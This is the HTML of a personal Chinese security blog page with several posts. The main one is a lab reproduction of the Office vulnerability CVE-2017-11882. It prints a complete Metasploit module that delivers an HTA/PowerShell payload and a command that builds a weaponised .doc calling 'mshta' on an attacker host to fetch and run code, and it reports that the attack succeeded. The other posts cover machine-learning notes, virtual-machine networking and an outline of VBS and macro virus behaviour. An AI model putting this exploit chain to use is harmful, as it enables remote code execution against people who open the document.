      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/14/cve-2017-11882-lou-dong-fen-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/" class="post-title-link" itemprop="url">cve-2017-11882漏洞分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-14 13:51:32 / 修改时间：14:27:02" itemprop="dateCreated datePublished" datetime="2021-08-14T13:51:32+08:00">2021-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><pre class="line-numbers language-none"><code class="language-none">实验环境：
1. kali 2020.03 ip:192.168.98.200
2. windows 7 x64 + office 2016
3. msf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="POC-计算器"><a href="#POC-计算器" class="headerlink" title="POC-计算器"></a>POC-计算器</h2><p>poc来源：<a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a><br>打开example.rtf,弹出计算器。    </p>
<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E8%AE%A1%E7%AE%97%E5%99%A8.png" class="">

<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>msf利用脚本</p>
<pre class="line-numbers language-rb" data-language="rb"><code class="language-rb">## This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule  &lt; Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info  = {})
    super(update_info(info,
      'Name' =&gt; 'Microsoft Office Payload Delivery',
      'Description' =&gt; %q{
        This module generates an command to place within
        a word document, that when executed, will retrieve a HTA payload
        via HTTP from an web server. Currently have not figured out how
        to generate a doc.
      },
      'License' =&gt; MSF_LICENSE,
      'Arch' =&gt; ARCH_X86,
      'Platform' =&gt; 'win',
      'Targets' =&gt;
        [
          ['Automatic', {} ],
        ],
      'DefaultTarget' =&gt; 0,
    ))
  end

  def on_request_uri(cli, _request)
    print_status("Delivering payload")
    p = regenerate_payload(cli)
    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      ARCH_X86,
      'win',
      p.encoded,
      'hta-psh',
      { :arch =&gt; ARCH_X86, :platform =&gt; 'win '}
    )
    send_response(cli, data, 'Content-Type' =&gt; 'application/hta')
  end


  def primer
    url = get_uri
    print_status("Place the following DDE in an MS document:")
    print_line("mshta.exe \"#{url}\"")
  end
end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将脚本放入/usr/share/metasploit-framework/modules/exploits/windows目录中。</p>
<h3 id="生成doc文档"><a href="#生成doc文档" class="headerlink" title="生成doc文档"></a>生成doc文档</h3><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># 生成doc文档
python Command109b_CVE-2017-11882.py -c "mshta http://192.168.98.200:8080/abc" -o test.doc

# 方便靶机下载
python -m SimpleHTTPServer 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>靶机访问 <a target="_blank" rel="noopener" href="http://192.168.98.200:6666/">http://192.168.98.200:6666/</a> 下载test.doc</p>
<h3 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h3><img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A81.png" class="">   
<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A82.png" class="">   
<p>靶机打开test.doc<br>利用成功    </p>
<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A83.png" class="">   
<img src="/2021/08/14/cve-2017-11882-lou-dong-fen-xi/%E5%88%A9%E7%94%A84.png" class="">   


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/13/ji-qi-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/13/ji-qi-xue-xi/" class="post-title-link" itemprop="url">机器学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-13 21:28:47" itemprop="dateCreated datePublished" datetime="2021-08-13T21:28:47+08:00">2021-08-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-28 00:08:35" itemprop="dateModified" datetime="2021-08-28T00:08:35+08:00">2021-08-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/08/13/ji-qi-xue-xi/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/13/ji-qi-xue-xi/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>两类问题：分类、预测</p>
<h1 id="正规方程"><a href="#正规方程" class="headerlink" title="正规方程"></a>正规方程</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60719445">https://zhuanlan.zhihu.com/p/60719445</a></p>
<h1 id="过拟合问题"><a href="#过拟合问题" class="headerlink" title="过拟合问题"></a>过拟合问题</h1><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p>代价函数作文章，减少某些特征的影响   </p>
<img src="/2021/08/13/ji-qi-xue-xi/%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B01.jpg" class="">   


<p>正则化<br>缩小所有参数的值    </p>
<img src="/2021/08/13/ji-qi-xue-xi/%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B02.png" class="">   
<p>图中的λ称为正则化参数。<br>为什么能起到缩小所有参数的作用？<br>引入的式子是二次项。加入任意1个参数θ<sub>i</sub>变大为θ<sub>i</sub>'，都会有J(θ<sub>1</sub>,θ<sub>2</sub>,...,θ<sub>i</sub>,...) &lt;= J(θ<sub>1</sub>,θ<sub>2</sub>,...,θ<sub>i</sub>',...)<br>所谓调参，其实就是调整λ的值</p>
<h1 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h1><p>神经元模型    </p>
<img src="/2021/08/13/ji-qi-xue-xi/%E7%A5%9E%E7%BB%8F%E5%85%83%E6%A8%A1%E5%9E%8B.png" class="">
<img src="/2021/08/13/ji-qi-xue-xi/%E7%A5%9E%E7%BB%8F%E5%85%83%E6%A8%A1%E5%9E%8B2.png" class="">

<p>例子    </p>
<img src="/2021/08/13/ji-qi-xue-xi/%E7%A5%9E%E7%BB%8F%E5%85%83%E6%A8%A1%E5%9E%8B-%E4%BE%8B%E5%AD%90.png" class="">
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/" class="post-title-link" itemprop="url">虚拟机环境配置</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-12 21:38:46" itemprop="dateCreated datePublished" datetime="2021-08-12T21:38:46+08:00">2021-08-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-14 17:27:49" itemprop="dateModified" datetime="2021-08-14T17:27:49+08:00">2021-08-14</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>配置网络的时候一定要把网卡对应上！</p>
<h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><p>桥接模式对应的网卡就是宿主机本身使用的网卡</p>
<h3 id="复制物理网络连接状态"><a href="#复制物理网络连接状态" class="headerlink" title="复制物理网络连接状态"></a>复制物理网络连接状态</h3><p>复制物理网卡连接状态，就是说把你指定的、本机的、真实网卡的状态信息复制给虚拟机的虚拟网卡，比如说你的本机真实网卡链接到了家用路由器的LAN口上，获得到了DHCP分配的地址，那么你的虚拟网卡就好像和真是网卡接入了同一台交换机中，也可以获得DHCP分配到的地址。</p>
<h2 id="Host-only"><a href="#Host-only" class="headerlink" title="Host-only"></a>Host-only</h2><p>一般对应VM1网卡,不与外网相连</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
<li><p>eth0网卡丢失.<br> ifconfig -a发现eth0网卡仍然存在.    </p>
 <img src="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/ifconfig_a.png" class="">    
<p> ifconfig eth0 up以后没有ipv4地址！    </p>
 <img src="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/%E7%BD%91%E5%8D%A1%E9%87%8D%E5%90%AF.png" class="">    
<p> 解决方案1：设置静态ip然后重启网络服务    </p>
 <img src="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/%E9%9D%99%E6%80%81ip.png" class="">      
<p> /etc/init.d/networking restart</p>
</li>
<li><p>Linux无法ping通windows虚拟机，但是windows可以ping通linux虚拟机<br> 原因：windows的防火墙没有关掉</p>
</li>
</ol>
<h1 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h1><ol>
<li>服务自启动 <pre class="line-numbers language-none"><code class="language-none">systemctl enable/disable [service]
chkconfig [service] on/off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ol>
<h1 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h1><h2 id="硬盘扩容"><a href="#硬盘扩容" class="headerlink" title="硬盘扩容"></a>硬盘扩容</h2><p>ubuntu硬盘扩容：gparted一键扩容</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/10/vbs-jiao-ben-bing-du-he-hong-bing-du/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="n0rthwater">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="n0rthwater">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/10/vbs-jiao-ben-bing-du-he-hong-bing-du/" class="post-title-link" itemprop="url">VBS脚本病毒和宏病毒</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-10 16:19:18 / 修改时间：17:07:26" itemprop="dateCreated datePublished" datetime="2021-08-10T16:19:18+08:00">2021-08-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%97%85%E6%AF%92/" itemprop="url" rel="index"><span itemprop="name">病毒</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/08/10/vbs-jiao-ben-bing-du-he-hong-bing-du/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/10/vbs-jiao-ben-bing-du-he-hong-bing-du/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="VBS脚本病毒"><a href="#VBS脚本病毒" class="headerlink" title="VBS脚本病毒"></a>VBS脚本病毒</h1><h2 id="VBS的概念和使用"><a href="#VBS的概念和使用" class="headerlink" title="VBS的概念和使用"></a>VBS的概念和使用</h2><p>轻量级解释型语言</p>
<p>管理远程或本地计算机</p>
<h2 id="传播方式"><a href="#传播方式" class="headerlink" title="传播方式"></a>传播方式</h2><ol>
<li>自我复制</li>
<li>Email传播</li>
<li>局域网共享文件搜索</li>
<li>其它传播方式：网页、IRC</li>
</ol>
<h2 id="自我保护"><a href="#自我保护" class="headerlink" title="自我保护"></a>自我保护</h2><ol>
<li>自加密</li>
<li>检测危险对象</li>
<li>改变对象声明的方法</li>
<li>尝试关闭反病毒软件</li>
</ol>
<h1 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h1><h2 id="什么是宏？"><a href="#什么是宏？" class="headerlink" title="什么是宏？"></a>什么是宏？</h2><p>组织到一起的命令</p>
<p>VBA</p>
<h2 id="传播方式-1"><a href="#传播方式-1" class="headerlink" title="传播方式"></a>传播方式</h2><p>支持自动执行宏</p>
<p>感染：</p>
<ol>
<li>内建宏 单个文档</li>
<li>全局宏 模板</li>
</ol>
<p>感染路径：</p>
<ol>
<li>单机：单个文档→模板→多个文档</li>
<li>网络：电子邮件</li>
</ol>
<h2 id="自我保护-1"><a href="#自我保护-1" class="headerlink" title="自我保护"></a>自我保护</h2><ol>
<li>禁止提示信息</li>
<li>屏蔽命令菜单</li>
<li>隐藏真实代码</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">n0rthwater</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">26</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/n0rthwater" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;n0rthwater" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">n0rthwater</span>
</div>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'B646Qmi9vGiJO0WD0drOUl4t-gzGzoHsz',
      appKey     : 'fok3WfEXmQeIkOGVzrYg4tSC',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
